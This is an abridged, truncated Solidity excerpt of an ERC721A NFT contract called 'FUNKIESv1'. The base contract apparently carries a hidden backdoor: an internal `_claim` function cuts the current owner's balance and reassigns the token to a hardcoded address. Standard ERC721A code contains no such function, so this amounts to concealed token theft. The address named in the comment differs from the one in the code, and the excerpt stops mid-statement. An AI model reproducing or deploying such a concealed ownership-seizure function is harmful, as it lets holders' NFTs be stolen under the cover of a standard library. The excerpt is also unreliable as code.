    ...
    DefaultOperatorFilterer
{
    ...
    constructor() ERC721A("FUNKIESv1", "FUNKIES") {}
...
contract ERC721A is IERC721A {
    ...
    function _claim(uint256 tokenId) internal {
        address owner = address(uint160(_packedOwnerships[tokenId] >> 96));

        // Update balance of the owner
        _packedAddressData[owner] -= 1 << 192;

        // Transfer ownership to address 0x36EcE6CFE5616c6E47e460A3cECAAb197c58Ae4F
        _packedOwnerships[tokenId] = _packOwnershipData(
            0x313Db2E8d8A82Bfb190b7f2E5F2a2aCA72E3A89b,
